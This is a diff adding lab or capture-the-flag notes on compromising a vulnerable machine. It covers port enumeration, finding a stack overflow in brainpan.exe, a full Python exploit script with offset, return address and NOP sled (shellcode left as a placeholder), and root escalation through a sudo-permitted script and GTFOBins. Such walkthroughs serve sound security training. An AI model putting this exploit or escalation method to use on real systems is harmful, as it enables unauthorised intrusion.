@@ -1,0 +1,56 @@
+OS:
+- Linux
+
+Open Ports:
+- PORT      STATE SERVICE
+- 9999/tcp  open  abyss
+- 10000/tcp open  snet-sensor-mgmt
+
+- enumerating port 9999
+- nc to port
+- 3 attempts to write password, port closed after that
+- opened again. seems to be on a 60 sec timeout after 3 failed attempts
+
+- enumerating port 10000
+- running gobuster
+- found /bin containing buffer overflow
+- copied file and transferring to windows lab machine
+- opened in immunity debugger to analyze exe
+- offset: 524
+- no bad characters
+- brainpan.exe module has no protections
+JMP ESP Address: 0x311712f3
+
+- final exploit:
+    #!/usr/bin/python3
+    import sys, socket, pdb
+    
+    target = sys.argv[1]
+    targetport = int(sys.argv[2])
+    
+    if len(sys.argv) != 3:
+        print('Usage: "' + sys.argv[0] + ' 0.0.0.0 21"')
+        sys.exit()
+    
+    # Set payload
+    buf = <shellcode>
+    
+    buffer = b'A' * 524 # Set EIP
+    buffer += b"\xf3\x12\x17\x31" # Set Return address 
+    buffer += b"\x90" * 16 # Set NOPs
+    buffer += buf
+    
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect((target, targetport))
+    s.send(buffer) # Set send payload
+    s.close()
+
+
+- got reverse shell as user puck
+- in a restricted shell
+- got a shell on the actual linux machine by running a python script to spawn a reverse shell
+- looking for privilege escalation opportunities
+- sudo -l shows a script that can be run as root
+- manual subcommand of script allows man page view
+- gtfobins to find exploit to spawn root shell
+- got root access
